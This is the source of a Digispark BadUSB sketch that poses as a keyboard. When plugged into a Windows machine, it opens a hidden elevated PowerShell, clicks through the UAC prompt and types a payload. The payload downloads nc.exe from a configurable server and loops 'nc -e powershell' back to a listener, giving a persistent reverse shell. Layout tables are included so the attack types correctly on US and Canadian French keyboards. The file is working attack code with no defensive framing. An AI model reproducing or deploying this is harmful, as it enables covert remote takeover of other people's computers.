#include<DigiKeyboard.h>

//MODIFY DIGIKEYBOARD.CPP TO REMOVE THE 5MS DELAY BEFORE EACH KEYPRESS

//https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h   CONSTANTS
//Tuto: https://www.youtube.com/watch?v=Raecw-Vs-40
//Main.hex: https://drive.google.com/file/d/1z55WoeLUVXS764OyOiC_GKl_kp9dt2BI/view
//drag main.hex over micronucleus.exe (in digispark driver stuff) to install bootloader to digispark

const char server[] PROGMEM = "localhost";
const char downloadPort[] PROGMEM = "54414";
const char listenerPort[] PROGMEM = "47017";


//uncomment this line to use the printAll function
//#define PRINTALL
//CMS, Canadial Multilingual Standard: "##########\n##################### !##$%&#()*+,-.#0123456789:;'=\"#@ABCDEFGHIJKLMNOPQRSTUVWXYZ^##?_/abcdefghijklmnopqrstuvwxyz¨##\\"
//US, US Keyboard:                     "##########\n##################### !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
//CAFR, Canadian French Keyboard:      "##########\n##################### !`/$%&`()*+,-.#0123456789:;'=.#\"ABCDEFGHIJKLMNOPQRSTUVWXYZ^<#?_#abcdefghijklmnopqrstuvwxyz^>¨|"

//below was passed through 'Reverser.js' to produce.
const char CMS[129]  PROGMEM = "##########\n##################### !>~$%&<()*+,-.`0123456789:;#=#^@ABCDEFGHIJKLMNOPQRSTUVWXYZ##[_#abcdefghijklmnopqrstuvwxyz#####";
const char US[129]   PROGMEM = "##########\n##################### !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
const char CAFR[129] PROGMEM = "}#########\n##################### !@`$%&<()*+,->#0123456789:;\\=|^#ABCDEFGHIJKLMNOPQRSTUVWXYZ###{_'abcdefghijklmnopqrstuvwxyz#~##";

const unsigned int keyboardsLength = 2;
const char* const keyboards[keyboardsLength] = {CAFR, US};

const char STR0[] PROGMEM = "powershell -WindowStyle Hidden"; //"powershell";
const char STR1[] PROGMEM = "$p = \"$env:temp/nc.exe\";(New-Object System.Net.WebClient).DownloadFile(\"http://";
const char STR2[] PROGMEM = ":";
const char STR3[] PROGMEM = "/\", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList \"";
const char STR4[] PROGMEM = "\",\"";
const char STR5[] PROGMEM = "\",\"-e\",\"powershell\";sleep 1}\n\n";

//smartPrint is a function to support many keyboard layouts
void smartPrint(const char string[], int keyboard){
  for (int c = 0; pgm_read_byte_near(string + c) != '\0'; c++){
    char toPrint;
    //character to print = keyboards.getKeyboard(keyboard).getCharacter(string[c]);
    if (pgm_read_byte_near(string + c) >= 128 || keyboard >= keyboardsLength) toPrint = '#';
    else toPrint = pgm_read_byte_near(keyboards[keyboard] + pgm_read_byte_near(string + c));

    //CMS
         if(pgm_read_byte_near(string + c) == '[' && keyboard == -1) DigiKeyboard.sendKeyStroke(KEY_9, MOD_CONTROL_LEFT | MOD_ALT_LEFT); // 9
    else if(pgm_read_byte_near(string + c) == ']' && keyboard == -1) DigiKeyboard.sendKeyStroke(KEY_0, MOD_CONTROL_LEFT | MOD_ALT_LEFT); // 0
    else if(pgm_read_byte_near(string + c) == '{' && keyboard == -1) DigiKeyboard.sendKeyStroke(KEY_7, MOD_CONTROL_LEFT | MOD_ALT_LEFT); // 7
    else if(pgm_read_byte_near(string + c) == '}' && keyboard == -1) DigiKeyboard.sendKeyStroke(KEY_8, MOD_CONTROL_LEFT | MOD_ALT_LEFT); // 8
    //CAFR
    //https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf   p. 54 at [ and ]
    else if(pgm_read_byte_near(string + c) == '[' && keyboard == 0) DigiKeyboard.sendKeyStroke(47,    MOD_CONTROL_LEFT | MOD_ALT_LEFT); // ^
    else if(pgm_read_byte_near(string + c) == ']' && keyboard == 0) DigiKeyboard.sendKeyStroke(48,    MOD_CONTROL_LEFT | MOD_ALT_LEFT); // ¸
    //https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf   p. 54 at { and }
    else if(pgm_read_byte_near(string + c) == '{' && keyboard == 0) DigiKeyboard.sendKeyStroke(52,    MOD_CONTROL_LEFT | MOD_ALT_LEFT); // `
    else if(pgm_read_byte_near(string + c) == '}' && keyboard == 0) DigiKeyboard.sendKeyStroke(49,    MOD_CONTROL_LEFT | MOD_ALT_LEFT); // <
    else DigiKeyboard.print(toPrint);
  }
}



void setup() {
  // put your setup code here, to run once:
#ifdef PRINTALL
  delay(1500);

  //print all characters to get the reversed keyboard array for a specific keyboard
  for (char c = 0; c < 32; c++) DigiKeyboard.print('#');
  for (char c = 32; c < 128 - 1; c++) DigiKeyboard.print(c);
#else
  pinMode(1, OUTPUT);
  digitalWrite(1, LOW);

  //Windows+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(300);
  //run Powershell as administrator
  //for some reason we can still type in a hidden Powershell window...
  smartPrint(STR0, 0);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  delay(750);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  delay(250);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
  //type in the payload
  for(int k = 0; k < keyboardsLength; k++){
    smartPrint(STR1, k);
    smartPrint(server, k);
    smartPrint(STR2, k);
    smartPrint(downloadPort, k);
    smartPrint(STR3, k);
    smartPrint(server, k);
    smartPrint(STR4, k);
    smartPrint(listenerPort, k);
    smartPrint(STR5, k);
    //blink the LED to signal that a payload has been sent
    digitalWrite(1, HIGH);
    delay(100);
    digitalWrite(1, LOW);
  }
  
  //turn on the built-in LED to show that the operation finished successfully
  digitalWrite(1, HIGH);
#endif
}

void loop() {

}
